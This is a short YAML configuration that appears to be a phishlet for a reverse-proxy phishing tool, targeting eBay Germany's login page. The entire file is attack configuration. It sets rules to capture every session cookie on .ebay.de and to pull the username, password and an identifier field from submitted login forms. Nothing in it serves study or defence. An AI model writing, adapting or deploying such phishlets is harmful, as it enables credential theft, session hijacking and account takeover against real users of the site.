auth_tokens:
  - domain: '.ebay.de'
    keys: ['.*,regexp']

auth_urls:
  - '/'
credentials:
  username:
    key: 'userid'
    search: '(.*)'
    type: 'post'
  password:
    key: 'pass'
    search: '(.*)'
    type: 'post'
  custom:
    - key: 'identifier'
      search: '(.*)'
      type: 'post'
login:
  domain: 'www.ebay.de'
  path: '/'
